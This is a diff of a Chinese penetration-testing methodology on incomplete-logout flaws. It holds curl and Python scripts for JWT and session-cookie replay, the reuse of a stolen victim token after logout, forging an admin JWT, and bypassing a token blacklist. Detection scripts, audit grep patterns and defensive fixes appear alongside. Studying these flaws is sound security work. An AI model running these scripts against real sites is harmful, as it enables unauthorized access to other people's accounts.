@@ -3,394 +3,317 @@
 ## 第一部分：文档概述
 
 ### 1.1 编写目的
-本文档为渗透测试人员提供一套标准化、可复现的不完整登出攻击流程，用于检测和利用会话终止机制中的缺陷。通过系统性的方法论，帮助测试人员发现并验证登出后会话/令牌仍然有效的漏洞，实现会话劫持和未授权访问。
+本方法论文档旨在为渗透测试人员提供一套标准化、可复现的不完整登出攻击流程，针对应用程序在用户登出时未完全清除所有认证令牌（如 JWT、Session Cookie）的缺陷进行系统性测试与利用，实现令牌重放攻击和会话劫持。
 
 ### 1.2 适用范围
 本文档适用于以下场景：
-- 登出时仅清除服务器端会话，未清除客户端令牌（JWT/Cookie）
-- JWT 令牌无过期时间（exp claim）
-- 无令牌撤销机制（token revocation/blacklist）
-- 混合认证系统（Session + JWT）的登出不完整
-- Flask/Python/Django 等 Web 应用的登出实现
+- 登出后 JWT 令牌未被清除或吊销
+- 登出后会话 Cookie 仍然有效
+- 多令牌认证系统（JWT+Session）部分清除
+- JWT 无过期时间（exp claim 缺失）
+- 无服务器端令牌吊销机制
 
 ### 1.3 读者对象
-- 执行渗透测试的安全工程师
-- 进行代码审计的安全分析师
-- 负责认证系统开发的开发人员
-- CTF 竞赛参与者
+本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。
 
 ---
 
 ## 第二部分：核心渗透技术专题
 
-### 专题一：不完整登出攻击
+### 专题一：JWT 令牌重放攻击
 
-#### 2.1 技术介绍
+#### 2.1.1 技术介绍
+不完整登出是指应用程序在用户登出时仅清除部分认证数据（如服务器端会话），但未清除或吊销客户端的认证令牌（如 JWT），导致攻击者可以重用这些令牌进行未授权访问。
 
-不完整登出（Incomplete Logout）是指应用程序在用户登出时，未能完全终止所有认证状态，导致客户端持有的令牌（如 JWT、Cookie）在登出后仍然有效。攻击者可以利用这些"僵尸令牌"重新获得对已登出账户的访问权限。
+**漏洞本质：** 应用程序缺乏完整的令牌吊销机制，登出操作未能使所有认证令牌失效。
 
-**漏洞本质：**
-- 登出时仅清除服务器端会话，未使客户端令牌失效
-- JWT 令牌无过期时间，永久有效
-- 无令牌撤销列表（Token Blacklist）机制
-- 混合认证系统中，仅清除部分认证凭据
+**典型代码特征：**
+```python
+# 漏洞代码 - 仅清除 Session，未清除 JWT
+@app.route('/logout', methods=['POST'])
+def logout():
+    session.pop('user_id', None)  # 仅清除 Session
+    return redirect(url_for('login'))
+    # 缺少：response.set_cookie('auth_token', '', expires=0)
 
-**攻击原理：**
+# JWT 无过期时间
+token = jwt.encode({"user_id": 123}, secret, algorithm="HS256")
+# 缺少：'exp': datetime.utcnow() + timedelta(hours=1)
 ```
-正常流程：
-用户登录 → 获得 Session + JWT → 访问资源 → 点击登出 → Session 清除 + JWT 清除 → 令牌失效
 
-攻击流程：
-攻击者窃取/捕获 JWT → 用户登出（仅清除 Session） → JWT 仍然有效 → 攻击者使用旧 JWT + 新 Session → 重新获得访问权限
-```
-
-#### 2.2 攻击常见于哪些业务场景
+#### 2.1.2 攻击常见业务场景
 
 | 业务场景 | 功能示例 | 风险点描述 |
 |---------|---------|-----------|
-| 混合认证系统 | Session + JWT 双令牌 | 登出时仅清除 Session，JWT 未清除 |
-| 单页应用 (SPA) | 前端存储 JWT | 登出时前端未清除 localStorage 中的 JWT |
-| 移动端应用 | 本地存储令牌 | 登出时未清除本地存储的认证令牌 |
-| 多设备登录 | 多端同时在线 | 一端登出，其他端令牌仍然有效 |
-| CTF 挑战 | JWT 认证 | 故意配置登出不完整，供参赛者利用 |
+| 混合认证系统 | JWT+Session 双令牌 | 登出时仅清除 Session，JWT 仍可重用 |
+| 单页应用 (SPA) | 前端存储 JWT | 登出后 JWT 仍保存在 localStorage |
+| 移动端应用 | 本地存储认证令牌 | 登出后令牌未从设备删除 |
+| 无状态 JWT 认证 | 纯 JWT 认证 | 无服务器端吊销机制 |
+| CTF 挑战应用 | 认证绕过获取 flag | 登出后仍可访问他人数据 |
 
-#### 2.3 漏洞探测方法
+#### 2.1.3 漏洞探测方法
 
-##### 2.3.1 黑盒测试
+**黑盒测试：**
 
-**步骤 1：捕获登录后的令牌**
-```bash
-# 登录并捕获令牌
-curl -i -X POST http://target/login \
-  -d "username=test&password=test" \
-  -c cookies.txt
+1. **基础登出测试**
+   ```bash
+   # 步骤 1：登录并捕获 JWT
+   curl -i -c cookies.txt -X POST http://target/login \
+     -d "username=test&password=test"
+   
+   # 从响应中提取 JWT
+   # Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+   
+   # 步骤 2：验证 JWT 可访问受保护资源
+   curl -b cookies.txt http://target/dashboard
+   # 应返回 200 OK + 仪表板内容
+   
+   # 步骤 3：执行登出
+   curl -i -b cookies.txt -X POST http://target/logout
+   
+   # 步骤 4：检查响应头中的 Set-Cookie
+   # 如果有：Set-Cookie: auth_token=; Expires=Thu, 01 Jan 1970...
+   # 说明 JWT 被正确清除
+   # 如果没有 Set-Cookie 或 JWT 值不变，说明存在漏洞
+   
+   # 步骤 5：尝试用原 JWT 访问受保护资源
+   curl -b cookies.txt http://target/dashboard
+   # 如果仍返回 200 OK，说明 JWT 仍可重用
+   ```
 
-# 查看捕获的令牌
-cat cookies.txt
+2. **JWT 重放测试**
+   ```bash
+   # 步骤 1：登录获取 JWT
+   JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+   
+   # 步骤 2：登录新会话获取新 Session
+   curl -c new_session.txt -X POST http/target/login \
+     -d "username=test&password=test"
+   
+   # 步骤 3：用旧 JWT+ 新 Session 访问
+   curl -b "new_session.txt; auth_token=$JWT" \
+     http://target/dashboard
+   
+   # 如果访问成功，说明旧 JWT 仍可重用
+   ```
 
-# 预期输出：
-# auth_token    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
-# session       eyJ1c2VyX2lkIjoxMDAzMn0...
-```
+3. **JWT 过期时间检查**
+   ```python
+   import jwt
+   import base64
+   import json
+   
+   token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+   
+   # 解码 payload（无需密钥）
+   payload_b64 = token.split('.')[1]
+   # 填充 Base64
+   payload_b64 += '=' * (4 - len(payload_b64) % 4)
+   payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+   
+   print(f"Payload: {payload}")
+   
+   # 检查 exp claim
+   if 'exp' not in payload:
+       print("[!] JWT has NO expiration time - tokens valid forever!")
+   else:
+       from datetime import datetime
+       exp_time = datetime.fromtimestamp(payload['exp'])
+       print(f"Expiration: {exp_time}")
+   ```
 
-**步骤 2：执行登出操作**
-```bash
-# 使用捕获的 Cookie 登出
-curl -i -X POST http://target/logout \
-  -b cookies.txt
+**白盒测试：**
 
-# 观察响应头中的 Set-Cookie
-# 预期（安全实现）：
-# Set-Cookie: auth_token=; expires=Thu, 01 Jan 1970 00:00:00 GMT
-# Set-Cookie: session=; expires=Thu, 01 Jan 1970 00:00:00 GMT
+1. **代码审计关键词搜索**
+   ```bash
+   # 搜索登出相关代码
+   grep -rn "def logout\|@app.route.*logout" --include="*.py"
+   grep -rn "function logout\|router.post.*logout" --include="*.js"
+   
+   # 搜索 Cookie 清除代码
+   grep -rn "set_cookie.*expires\|resp.set_cookie.*0" --include="*.py"
+   grep -rn "removeCookie\|clearCookie" --include="*.js"
+   
+   # 搜索 JWT 过期设置
+   grep -rn "'exp'\|\"exp\"" --include="*.py"
+   grep -rn "expiresIn\|exp:" --include="*.py"
+   ```
 
-# 预期（不安全实现）：
-# 无 Set-Cookie 头（JWT 未清除）
-# 或仅清除 session，未清除 auth_token
-```
+2. **漏洞代码模式识别**
+   ```python
+   # 漏洞代码示例 1 - 未清除 JWT Cookie
+   @app.route('/logout', methods=['POST'])
+   def logout():
+       session.pop('user_id', None)
+       return redirect(url_for('login'))
+       # 缺少：resp = redirect(...); resp.set_cookie('auth_token', '', expires=0)
+   
+   # 漏洞代码示例 2 - JWT 无过期时间
+   token = jwt.encode({
+       "user_id": user.id,
+       "username": user.username
+   }, secret, algorithm="HS256")
+   # 缺少：'exp': datetime.utcnow() + timedelta(hours=1)
+   ```
 
-**步骤 3：验证令牌是否仍然有效**
-```bash
-# 检查登出后的 Cookie 文件
-cat cookies.txt | grep auth_token
+#### 2.1.4 漏洞利用方法
 
-# 如果 auth_token 仍然存在，说明未清除
+**基础利用 - 令牌重放：**
 
-# 尝试使用旧 JWT 访问资源
-curl -i http://target/dashboard \
-  -b "session=NEW_SESSION; auth_token=OLD_JWT"
-
-# 如果返回 200 OK，说明 JWT 仍然有效
-```
-
-**步骤 4：令牌重放测试**
 ```python
 import requests
 
-# 步骤 1：登录获取 JWT
-session = requests.Session()
-session.post("http://target/login",
-            data={"username": "test", "password": "test"})
+# 步骤 1：登录并捕获 JWT
+session1 = requests.Session()
+session1.post("http://localhost:44191/password/test",
+    data={"password": "test", "username": "test"})
 
-# 捕获 JWT
-old_jwt = session.cookies.get('auth_token')
+# 从 Cookie 中提取 JWT
+old_jwt = session1.cookies.get_dict().get('auth_token')
 print(f"Captured JWT: {old_jwt}")
 
-# 步骤 2：登出
-session.post("http/target/logout")
+# 步骤 2：用户登出（模拟）
+session1.post("http://localhost:44191/logout")
 
-# 步骤 3：重新登录（获取新 Session）
-session.post("http://target/login",
-            data={"username": "test", "password": "test"})
+# 步骤 3：用户重新登录（获取新 Session）
+session2 = requests.Session()
+session2.post("http://localhost:44191/password/test",
+    data={"password": "test", "username": "test"})
 
-# 步骤 4：用旧 JWT 替换新 JWT
-session.cookies.set('auth_token', old_jwt)
+# 步骤 4：将旧 JWT 注入新会话
+session2.cookies.set('auth_token', old_jwt)
 
-# 步骤 5：测试旧 JWT 是否有效
-response = session.get("http://target/dashboard")
-if response.status_code == 200:
-    print("[+] VULNERABILITY CONFIRMED: Old JWT still valid after logout")
+# 步骤 5：用旧 JWT 访问受保护资源
+response = session2.get("http://localhost:44191/dashboard")
+
+if "Welcome" in response.text:
+    print("[+] JWT REPLAY SUCCESSFUL - Old token still valid!")
+    print(f"Response: {response.text[:200]}")
 else:
-    print("[-] JWT properly invalidated on logout")
+    print("[-] JWT replay failed")
 ```
 
-##### 2.3.2 白盒测试
+**进阶利用 - 令牌窃取与重用：**
 
-**代码审计要点：**
-
-1. **查找登出实现**
-```bash
-# Python/Flask
-grep -r "logout" . --include="*.py"
-grep -r "session.pop" . --include="*.py"
-grep -r "set_cookie.*auth_token" . --include="*.py"
-
-# Django
-grep -r "logout" . --include="*.py"
-grep -r "flush" . --include="*.py"
-
-# Node.js
-grep -r "logout" . --include="*.js"
-grep -r "clearCookie" . --include="*.js"
-```
-
-2. **检查登出逻辑**
 ```python
-# 危险实现示例（Flask）
-@app.route('/logout', methods=['POST'])
-def logout():
-    session.pop('user_id', None)  # 仅清除 session
-    return redirect(url_for('login'))
-    # 缺少：resp.set_cookie('auth_token', '', expires=0)
+# 场景：攻击者通过 XSS 或网络拦截获取 JWT
 
-# 安全实现示例
-@app.route('/logout', methods=['POST'])
-def logout():
-    session.pop('user_id', None)
-    resp = redirect(url_for('login'))
-    resp.set_cookie('auth_token', '', expires=0)  # 清除 JWT
-    resp.set_cookie('session', '', expires=0)  # 清除 session
-    return resp
-```
-
-3. **检查 JWT 过期配置**
-```python
-# 危险实现：JWT 无过期时间
-token = jwt.encode({
-    "username": username,
-    "user_id": user.id,
-    "user_type": "customer"
-    # 缺少："exp": datetime.utcnow() + timedelta(hours=1)
-}, SECRET_KEY, algorithm='HS256')
-
-# 安全实现：JWT 有过期时间
-from datetime import datetime, timedelta
-
-token = jwt.encode({
-    "username": username,
-    "user_id": user.id,
-    "exp": datetime.utcnow() + timedelta(hours=1)  # 1 小时后过期
-}, SECRET_KEY, algorithm='HS256')
-```
-
-#### 2.4 漏洞利用方法
-
-##### 2.4.1 基础令牌重放
-
-**方法 1：直接重放旧 JWT**
-```python
-import requests
-
-def replay_jwt_after_logout():
-    # 步骤 1：登录
-    session = requests.Session()
-    session.post("http://localhost:44191/password/test",
-                data={"password": "test", "username": "test"})
-    
-    # 捕获 JWT
-    old_jwt = session.cookies.get('auth_token')
-    print(f"Step 1: JWT captured - {old_jwt[:50]}...")
-    
-    # 步骤 2：验证 JWT 有效
-    r = session.get("http://localhost:44191/dashboard")
-    assert r.status_code == 200
-    print("Step 2: Dashboard accessible with original session")
-    
-    # 步骤 3：登出
-    session.post("http://localhost:44191/logout")
-    print("Step 3: User logged out")
-    
-    # 步骤 4：验证 JWT 未清除
-    if session.cookies.get('auth_token'):
-        print("Step 4: JWT NOT cleared from cookies")
-    else:
-        print("Step 4: JWT cleared from cookies")
-        return
-    
-    # 步骤 5：重新登录（获取新 session）
-    session.post("http://localhost:44191/password/test",
-                data={"password": "test", "username": "test"})
-    print("Step 5: User logged in again (new session)")
-    
-    # 步骤 6：用旧 JWT 替换
-    session.cookies.set('auth_token', old_jwt)
-    print("Step 6: Replaced new JWT with old JWT")
-    
-    # 步骤 7：测试旧 JWT
-    r = session.get("http://localhost:44191/dashboard")
-    if r.status_code == 200:
-        print(f"Step 7: VULNERABILITY CONFIRMED - Dashboard accessible with old JWT")
-        print(f"Response: {r.text[:200]}...")
-    else:
-        print(f"Step 7: Old JWT rejected (status: {r.status_code})")
-
-# 执行测试
-replay_jwt_after_logout()
-```
-
-**方法 2：跨会话令牌重放**
-```python
-import requests
-
-def cross_session_replay():
-    # 会话 A：受害者登录
-    victim_session = requests.Session()
-    victim_session.post("http://target/login",
-                       data={"username": "victim", "password": "password123"})
-    victim_jwt = victim_session.cookies.get('auth_token')
-    
-    # 攻击者捕获 JWT（通过 XSS、网络嗅探等）
-    print(f"Attacker captured victim's JWT: {victim_jwt[:50]}...")
-    
-    # 受害者登出
-    victim_session.post("http/target/logout")
-    print("Victim logged out")
-    
-    # 会话 B：攻击者使用捕获的 JWT
-    attacker_session = requests.Session()
-    attacker_session.cookies.set('auth_token', victim_jwt)
-    
-    # 攻击者访问受害者账户
-    r = attacker_session.get("http://target/dashboard")
-    if r.status_code == 200:
-        print("[+] SUCCESS: Attacker accessed victim's account after logout")
-```
-
-##### 2.4.2 组合攻击链
-
-**攻击链：XSS 窃取 → 登出后重放 → 权限维持**
-```python
 import requests
 import time
 
-def xss_token_theft_chain():
-    # 步骤 1：通过 XSS 窃取 JWT（模拟）
-    # 实际场景中，攻击者通过 XSS payload 获取 document.cookie
-    stolen_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0..."
-    print(f"Step 1: JWT stolen via XSS - {stolen_jwt[:50]}...")
-    
-    # 步骤 2：等待受害者登出
-    print("Step 2: Waiting for victim to log out...")
-    time.sleep(2)  # 模拟等待
-    
-    # 步骤 3：攻击者使用窃取的 JWT
-    attacker = requests.Session()
-    attacker.cookies.set('auth_token', stolen_jwt)
-    
-    # 步骤 4：访问受害者账户
-    r = attacker.get("http://localhost:44191/dashboard")
-    if r.status_code == 200:
-        print("Step 4: SUCCESS - Attacker accessed account after victim logout")
-        print(f"Dashboard content: {r.text[:200]}...")
-    
-    # 步骤 5：权限维持（JWT 永久有效）
-    print("Step 5: JWT remains valid indefinitely - persistent access possible")
+stolen_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
 
-# 执行攻击链
-xss_token_theft_chain()
+# 等待受害者登出（增加隐蔽性）
+time.sleep(3600)  # 等待 1 小时
+
+# 用窃取的 JWT 访问
+session = requests.Session()
+# 如果需要 Session 配合，先建立新会话
+session.post("http://target/login", data={"user": "any", "pass": "any"})
+session.cookies.set('auth_token', stolen_jwt)
+
+response = session.get("http://target/account")
+print(response.text)  # 访问受害者账户
 ```
 
-**攻击链：网络嗅探 → 令牌重放 → 账户接管**
-```bash
-#!/bin/bash
+**组合攻击 - JWT 伪造 + 重放：**
 
-# 场景：HTTP 明文传输，攻击者嗅探网络获取 JWT
-
-# 步骤 1：嗅探网络流量（需要网络访问权限）
-# tcpdump -i eth0 -s 0 -A 'tcp port 80' | grep -i "auth_token"
-
-# 步骤 2：提取 JWT
-CAPTURED_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
-
-# 步骤 3：等待目标登出
-echo "Waiting for target to log out..."
-sleep 10
-
-# 步骤 4：使用捕获的 JWT 访问账户
-curl -H "Cookie: auth_token=$CAPTURED_JWT" \
-     http://target/dashboard
-
-# 步骤 5：如果返回 200，说明 JWT 仍然有效
-# 攻击者可以持续访问，直到 JWT 自然过期（如果配置了过期时间）
-```
-
-#### 2.5 漏洞利用绕过方法
-
-##### 2.5.1 绕过 JWT 过期检查
-
-**场景：JWT 有过期时间，但时间较长**
-
-**方法 1：在过期前使用**
 ```python
 import jwt
-from datetime import datetime
 
-# 解码 JWT 查看过期时间
-token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
-decoded = jwt.decode(token, options={"verify_signature": False})
+# 如果 JWT 签名验证也被禁用
+# 1. 获取合法 JWT 结构
+original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0.xxx"
 
-exp_timestamp = decoded.get('exp')
-if exp_timestamp:
-    exp_time = datetime.fromtimestamp(exp_timestamp)
-    print(f"JWT expires at: {exp_time}")
-    
-    # 在过期前尽快使用
-    # 如果还有很长时间，可以设置定时任务定期刷新
+# 2. 修改为特权用户
+payload = {
+    "username": "admin",
+    "user_id": 1,
+    "role": "administrator"
+}
+
+# 3. 伪造 JWT（签名验证被禁用）
+forged_jwt = jwt.encode(payload, "any_secret", algorithm="HS256")
+
+# 4. 重放伪造的 JWT
+import requests
+session = requests.Session()
+session.cookies.set('auth_token', forged_jwt)
+response = session.get("http://target/admin/dashboard")
 ```
 
-**方法 2：刷新令牌（如果应用支持）**
+#### 2.1.5 漏洞利用绕过方法
+
+**绕过 Session 检查：**
+
+如果应用同时检查 Session 和 JWT：
+
+```python
+# 方法：保持有效 Session，仅替换 JWT
+session = requests.Session()
+
+# 建立合法 Session
+session.post("http://target/login", data={"user": "attacker", "pass": "pass"})
+
+# 保存合法 Session Cookie
+valid_session = session.cookies.get_dict()
+
+# 注入目标用户的 JWT
+target_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+session.cookies.set('auth_token', target_jwt)
+
+# 访问目标资源
+response = session.get("http://target/admin/data")
+```
+
+**绕过 JWT 黑名单：**
+
+如果应用实现了 JWT 黑名单：
+
+```python
+# 方法：修改 JWT 中的唯一标识符（如 jti claim）
+import jwt
+
+payload = {
+    "user_id": 10019,
+    "jti": "new_unique_id_123"  # 更改唯一标识
+}
+
+new_jwt = jwt.encode(payload, secret, algorithm="HS256")
+# 新 JWT 有不同的 jti，可能绕过黑名单
+```
+
+---
+
+### 专题二：会话 Cookie 重放
+
+#### 2.2.1 技术介绍
+会话 Cookie 重放是指应用程序在用户登出后未使服务器端会话失效，导致攻击者可以重用捕获的会话 Cookie 进行未授权访问。
+
+#### 2.2.2 探测与利用
+
 ```python
 import requests
 
-def refresh_token():
-    # 有些应用在 JWT 快过期时提供刷新端点
-    session = requests.Session()
-    session.cookies.set('auth_token', old_jwt)
-    
-    # 尝试刷新
-    r = session.post("http://target/refresh")
-    if r.status_code == 200:
-        new_jwt = r.cookies.get('auth_token')
-        print(f"Token refreshed: {new_jwt[:50]}...")
-```
+# 步骤 1：登录获取 Session Cookie
+session1 = requests.Session()
+session1.post("http://target/login",
+    data={"username": "victim", "password": "pass"})
 
-##### 2.5.2 绕过令牌撤销检查
+session_cookie = session1.cookies.get_dict().get('session')
+print(f"Session: {session_cookie}")
 
-**场景：应用有令牌黑名单，但检查不严格**
+# 步骤 2：用户登出
+session1.post("http://target/logout")
 
-**方法：使用 JWT 变体**
-```python
-import jwt
+# 步骤 3：用原 Session Cookie 访问
+session2 = requests.Session()
+session2.cookies.set('session', session_cookie)
 
-# 如果应用仅检查完整的 JWT 字符串是否在黑名单中
-# 可以尝试修改 JWT 格式（如果签名验证被禁用）
+response = session2.get("http://target/dashboard")
 
-# 方法 1：添加额外 claims
-original_payload = {"user_id": 10019, "username": "test"}
-modified_payload = {"user_id": 10019, "username": "test", "iat": 1234567890}
-
-# 如果签名验证被禁用，修改后的 JWT 可能仍然有效
-modified_jwt = jwt.encode(modified_payload, "any_secret", algorithm="HS256")
+if response.status_code == 200:
+    print("[+] Session replay successful!")
 ```
 
 ---
@@ -399,117 +322,153 @@ modified_jwt = jwt.encode(modified_payload, "any_secret", algorithm="HS256")
 
 ### 3.1 常用 Payload 速查表
 
-| 类别 | 测试点 | Payload 示例 | 说明 |
-|-----|-------|------------|------|
-| 登出测试 | POST /logout | 正常登出请求 | 观察 Set-Cookie 头 |
-| 令牌重放 | GET /dashboard | 旧 JWT + 新 Session | 测试 JWT 是否有效 |
-| 跨会话重放 | GET /dashboard | 窃取的 JWT | 测试跨会话有效性 |
-| 过期检查 | 解码 JWT | `jwt.decode(token)` | 查看 exp claim |
+| 攻击目标 | 测试方法 | 成功标志 |
+|---------|---------|---------|
+| JWT 重放 | 登出后用原 JWT 访问 | 返回 200 OK + 受保护内容 |
+| Session 重放 | 登出后用原 Session 访问 | 返回 200 OK + 受保护内容 |
+| JWT 过期检查 | 解码 JWT 检查 exp claim | 无 exp 或过期时间极远 |
+| Cookie 清除检查 | 登出响应检查 Set-Cookie | 无 auth_token 清除头 |
 
-### 3.2 自动化工具
+### 3.2 自动化测试脚本
 
-**Python 测试脚本：**
 ```python
 #!/usr/bin/env python3
 """
-Incomplete Logout Tester
-Usage: python3 incomplete_logout_test.py -t http://target
+不完整登出检测工具
+用法：python incomplete_logout.py -t http://target
 """
 
 import argparse
 import requests
-import sys
 
-def test_incomplete_logout(target):
-    print(f"[*] Testing incomplete logout at {target}")
+def test_incomplete_logout(target_url):
+    """测试不完整登出漏洞"""
     
-    # 步骤 1：登录
-    print("[*] Step 1: Logging in...")
+    # 登录
     session = requests.Session()
+    login_response = session.post(f"{target_url}/login",
+        data={"username": "test", "password": "test"})
     
-    login_data = {"username": "test", "password": "test"}
-    login_response = session.post(f"{target}/login", data=login_data)
-    
-    if login_response.status_code not in [200, 302]:
-        print("[-] Login failed, cannot test logout")
+    if login_response.status_code != 200:
+        print("[-] Login failed")
         return False
     
-    # 捕获 JWT
-    jwt_before = session.cookies.get('auth_token')
-    if not jwt_before:
-        jwt_before = session.cookies.get('token')
-    if not jwt_before:
-        print("[-] No JWT token found, cannot test")
+    # 获取 JWT
+    original_jwt = session.cookies.get('auth_token')
+    if not original_jwt:
+        print("[-] No JWT cookie found")
         return False
     
-    print(f"[+] JWT captured: {jwt_before[:50]}...")
+    print(f"[*] Captured JWT: {original_jwt[:50]}...")
     
-    # 步骤 2：登出
-    print("[*] Step 2: Logging out...")
-    logout_response = session.post(f"{target}/logout")
+    # 验证 JWT 有效
+    response = session.get(f"{target_url}/dashboard")
+    if response.status_code != 200:
+        print("[-] JWT not valid initially")
+        return False
+    
+    print("[+] JWT is valid before logout")
+    
+    # 登出
+    logout_response = session.post(f"{target_url}/logout")
     
     # 检查 Set-Cookie 头
     set_cookie = logout_response.headers.get('Set-Cookie', '')
-    
-    if 'auth_token=;' in set_cookie or 'auth_token=; expires' in set_cookie:
-        print("[+] JWT properly cleared in logout response")
-        jwt_cleared = True
+    if 'auth_token' in set_cookie and 'Expires' in set_cookie:
+        print("[+] JWT cookie cleared in logout response")
     else:
-        print("[-] JWT NOT cleared in logout response")
-        jwt_cleared = False
+        print("[!] JWT cookie NOT cleared in logout response")
     
-    # 步骤 3：检查 Cookie jar
-    jwt_in_jar = session.cookies.get('auth_token')
-    if jwt_in_jar:
-        print(f"[-] JWT still in cookie jar: {jwt_in_jar[:50]}...")
-    else:
-        print("[+] JWT cleared from cookie jar")
+    # 尝试用原 JWT 访问
+    session.cookies.set('auth_token', original_jwt)
+    response = session.get(f"{target_url}/dashboard")
     
-    # 步骤 4：令牌重放测试
-    print("[*] Step 4: Testing token replay...")
-    
-    # 重新登录获取新 session
-    session.post(f"{target}/login", data=login_data)
-    
-    # 替换为旧 JWT
-    session.cookies.set('auth_token', jwt_before)
-    
-    # 测试访问
-    test_response = session.get(f"{target}/dashboard")
-    
-    if test_response.status_code == 200:
-        print("[+] VULNERABILITY CONFIRMED: Old JWT still valid after logout")
+    if response.status_code == 200:
+        print("[!] VULNERABILITY: JWT still valid after logout!")
         return True
     else:
-        print(f"[-] Old JWT rejected (status: {test_response.status_code})")
+        print("[+] JWT invalidated after logout")
         return False
 
-def main():
-    parser = argparse.ArgumentParser(description='Incomplete Logout Tester')
-    parser.add_argument('-t', '--target', required=True, help='Target URL')
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", required=True)
     args = parser.parse_args()
     
-    vulnerable = test_incomplete_logout(args.target)
-    
-    if vulnerable:
-        print("\n[!] Target is VULNERABLE to incomplete logout attack")
-        sys.exit(1)
+    if test_incomplete_logout(args.target):
+        print("\n[+] Incomplete logout vulnerability detected!")
     else:
-        print("\n[*] Target appears to handle logout correctly")
-        sys.exit(0)
-
-if __name__ == '__main__':
-    main()
+        print("\n[-] No vulnerability detected")
 ```
 
-### 3.3 参考资源
+### 3.3 防御建议
+
+1. **完整清除所有令牌**
+   ```python
+   @app.route('/logout', methods=['POST'])
+   def logout():
+       # 清除 Session
+       session.clear()
+       
+       # 清除 JWT Cookie
+       response = redirect(url_for('login'))
+       response.set_cookie('auth_token', '',
+           expires=0,  # 立即过期
+           httponly=True,
+           secure=True,
+           samesite='Lax'
+       )
+       return response
+   ```
+
+2. **设置 JWT 过期时间**
+   ```python
+   import datetime
+   
+   token = jwt.encode({
+       "user_id": user.id,
+       "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
+   }, secret, algorithm="HS256")
+   ```
+
+3. **实施令牌吊销机制**
+   ```python
+   # 服务器端维护吊销列表
+   REVOKED_TOKENS = set()
+   
+   @app.route('/logout', methods=['POST'])
+   def logout():
+       token = request.cookies.get('auth_token')
+       REVOKED_TOKENS.add(token)  # 添加到吊销列表
+       session.clear()
+       return redirect(url_for('login'))
+   
+   def is_token_valid(token):
+       if token in REVOKED_TOKENS:
+           return False
+       # 正常验证逻辑
+   ```
+
+4. **绑定会话与令牌**
+   ```python
+   # JWT 中包含 Session ID
+   token = jwt.encode({
+       "user_id": user.id,
+       "session_id": session.sid
+   }, secret, algorithm="HS256")
+   
+   # 验证时检查 Session 是否有效
+   def validate_jwt(token):
+       payload = jwt.decode(token, secret, algorithms=["HS256"])
+       if payload['session_id'] != session.sid:
+           return False  # Session 已变更
+       return True
+   ```
+
+---
+
+## 参考资源
 
 - [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 - [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
 - [PortSwigger - Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
-
----
-
-**文档版本：** 1.0  
-**最后更新：** 2026 年 3 月 14 日  
-**适用技能：** authentication-failures, broken-access-control
